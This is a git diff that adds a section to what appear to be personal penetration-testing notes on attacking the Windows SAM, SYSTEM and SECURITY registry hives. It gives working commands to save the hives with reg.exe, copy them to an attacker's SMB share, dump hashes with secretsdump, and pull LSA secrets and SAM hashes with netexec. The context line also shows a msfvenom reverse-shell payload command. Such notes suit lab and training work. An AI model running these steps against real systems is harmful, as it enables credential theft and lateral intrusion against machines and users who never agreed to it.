@@ -186,6 +186,35 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx 
 
 ### Attacking SAM, SYSTEM, & SECURITY 
 ```
+# Regsitry Hives 
+    1. SAM: Hashes of user accounts 
+    2. SYSTEM: system boot key, which can decrypt the hashes 
+    3. SECURITY: inforamtion used by LSA, cached domain creds, cleartext passwords, DPAPI Keys 
+        3a. DPAPI: Data Protection Application Programming Interface
+
+# Copy Regsitry Hives useing reg.exe
+    1. reg.exe save hklm\sam C:\sam.save
+    2. Repeat for SYSTEM and SECURITY 
+
+# Transfer back to host using smbserver
+    1. sudo python3 smbserver.py -smb2support CompData ~
+    2. From target machine: move file \\[host ip]\dir
+
+# Dump Hashes using secretsdump
+    1. python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+
+# NOTE: Defending against Cred Dumping 
+    1. https://attack.mitre.org/techniques/T1003/002/
+
+# Extract LSA secrets from servcies, tasks, and applications (Using cracks creds)
+    1. netexec smb [ip] --local-auth -u bob -p [pass] --lsa
+
+# netexec to dump SAM 
+    1. netexec smb [ip] --local-auth -u bob -p [pass] --sam
+
+
+
+
 
 
 
